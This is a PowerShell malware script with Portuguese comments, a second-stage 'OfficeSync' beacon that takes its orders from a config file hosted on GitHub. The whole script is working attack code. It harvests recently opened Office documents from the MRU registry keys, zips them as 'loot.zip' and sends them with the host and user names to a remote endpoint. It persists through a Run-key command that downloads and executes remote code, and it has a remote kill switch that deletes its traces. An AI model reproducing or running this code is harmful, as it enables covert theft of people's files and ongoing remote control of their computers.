# ============================================================
#  OfficeSync - estagio 2
#  Beacon com tasking por dead drop resolver (T1102.001)
#  Ciclo: le config -> obedece -> dorme -> repete
# ============================================================
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

$cfgUrl = 'https://raw.githubusercontent.com/Capyvests/office-demmo/refs/heads/main/config.txt'
$estado = 'HKCU:\Software\OfficeSync'
$ext    = '.docx','.doc','.docm','.pptx','.ppt','.pptm','.xlsx','.xls'

if (-not (Test-Path $estado)) { New-Item -Path $estado -Force | Out-Null }

function Estado($nome, $valor) {
  if ($PSBoundParameters.ContainsKey('valor')) {
    Set-ItemProperty -Path $estado -Name $nome -Value $valor
  } else {
    (Get-ItemProperty -Path $estado -Name $nome -ErrorAction SilentlyContinue).$nome
  }
}

function NaJanela($ini, $fim, $hora) {
  if ($ini -eq $fim) { return $true }
  if ($ini -lt $fim) { return ($hora -ge $ini -and $hora -lt $fim) }
  return ($hora -ge $ini -or $hora -lt $fim)      # janela que atravessa a meia-noite
}

$cfg = $null

while ($true) {
  # ---- 1. beacon: buscar tasking (query anti-cache) ----
  $novo = $null
  try {
    $bruto = (Invoke-WebRequest -Uri "$cfgUrl`?t=$([DateTime]::UtcNow.Ticks)" `
              -UseBasicParsing -TimeoutSec 15).Content
    $limpo = ($bruto -split "`n" | Where-Object { $_ -match '=' }) -join "`n"
    if ($limpo) { $novo = $limpo | ConvertFrom-StringData }
  } catch {}

  if ($novo) { $cfg = $novo; Estado 'versao' $cfg.versao }
  if (-not $cfg) { Start-Sleep 60; continue }      # sem rede e sem tasking previo

  $intervalo = [int]$cfg.intervalo
  if ($intervalo -lt 10) { $intervalo = 10 }

  # ---- 2. kill switch / teardown ----
  if ([int]$cfg.destruir -eq 1) {
    try {
      Invoke-WebRequest -Uri $cfg.endpoint -Method Post -Body 'estado=destruido' `
        -UseBasicParsing -TimeoutSec 10 | Out-Null
    } catch {}
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
      -Name 'OfficeSync' -ErrorAction SilentlyContinue
    Remove-Item -Path $estado -Recurse -Force -ErrorAction SilentlyContinue
    exit
  }

  # ---- 3. portoes: ativo + janela horaria + quota ----
  $hora   = (Get-Date).Hour
  $envios = [int](Estado 'envios')
  $max    = [int]$cfg.max_envios
  $passa  = ([int]$cfg.ativo -eq 1) -and
            (NaJanela ([int]$cfg.hora_inicio) ([int]$cfg.hora_fim) $hora) -and
            ($max -eq 0 -or $envios -lt $max)

  if (-not $passa) { Start-Sleep -Seconds $intervalo; continue }

  # ---- 4. ciclo de recolha e exfiltracao ----
  $out = Join-Path $env:TEMP ('ofs_' + (Get-Random))
  New-Item -ItemType Directory -Path $out -Force | Out-Null

  $paths = @()
  foreach ($v in '16.0','15.0','14.0') {
    foreach ($a in 'Word','PowerPoint','Excel') {
      $k = "HKCU:\Software\Microsoft\Office\$v\$a\File MRU"
      if (Test-Path $k) {
        $props = Get-ItemProperty $k
        $props.PSObject.Properties.Name | Where-Object { $_ -like 'Item*' } | ForEach-Object {
          $paths += (($props.$_ -split '\*')[-1]).Trim()
        }
      }
    }
  }
  $paths = $paths | Where-Object {
      $_ -and ($ext -contains [IO.Path]::GetExtension($_).ToLower()) -and
      (Test-Path $_) -and ((Get-Item -LiteralPath $_).Length -lt 8MB)
    } | Select-Object -Unique -First 15

  if ($paths.Count -gt 0) {
    foreach ($x in $paths) { Copy-Item -LiteralPath $x -Destination $out -Force }
    $zip = Join-Path $out 'loot.zip'
    Compress-Archive -Path (Join-Path $out '*') -DestinationPath $zip -Force
    try {
      Invoke-WebRequest -Uri $cfg.endpoint -Method Post -InFile $zip `
        -ContentType 'application/zip' `
        -Headers @{ 'X-Host' = $env:COMPUTERNAME; 'X-User' = $env:USERNAME;
                    'X-Ciclo' = "$($envios + 1)"; 'X-Versao' = "$($cfg.versao)" } `
        -UseBasicParsing -TimeoutSec 30 | Out-Null
      Estado 'envios' ($envios + 1)
      Estado 'ultimo' (Get-Date).ToString('s')
    } catch {}
  }
  Remove-Item $out -Recurse -Force

  # ---- 5. persistencia idempotente ----
  $cmd = 'powershell -w h -ep bypass -c "iex(iwr ''{0}'' -useb)"' -f $cfgUrl
  Set-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' `
    -Name 'OfficeSync' -Value $cmd

  Start-Sleep -Seconds $intervalo
}
